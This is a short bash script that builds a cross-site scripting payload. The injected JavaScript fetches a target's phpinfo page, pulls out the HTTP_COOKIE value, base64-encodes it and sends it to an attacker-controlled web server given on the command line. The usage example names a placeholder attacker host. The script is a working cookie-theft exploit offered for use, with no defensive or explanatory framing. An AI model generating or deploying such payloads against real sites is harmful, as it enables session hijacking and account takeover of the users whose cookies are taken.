#!/bin/bash

# Get the URL parameters
php_info_page_url=$1
attacker_web_server_url=$2

# Check if the URL parameters are provided
if [ -z "$php_info_page_url" ] || [ -z "$attacker_web_server_url" ]; then
  # Print an error message and exit if the URL parameters are not provided
  echo "Error: any of the URL parameters are not provided"
  echo "Usage: $0 <php_info_page_url> <attacker_web_server_url>"
  echo "Example: $0 http://vulnerable-server-to-xss.com/phpinfo.php http://attacker-web-server.com/"
  exit 1
fi

# Fill the JavaScript code template with the URL parameters
javascript_code="<script>fetch('$php_info_page_url').then(response=>response.text()).then(data=>{const startString='<tr><td class=\"e\">HTTP_COOKIE </td><td class=\"v\">';const endString='</td></tr>';const startIndex=data.indexOf(startString)+startString.length;const endIndex=data.indexOf(endString,startIndex);const cookies=data.substring(startIndex,endIndex);const encodedCookies=btoa(cookies);fetch('$attacker_web_server_url'+'?encodedCookies='+encodedCookies,{method:'GET'});});</script>"

# Output the JavaScript code
echo $javascript_code
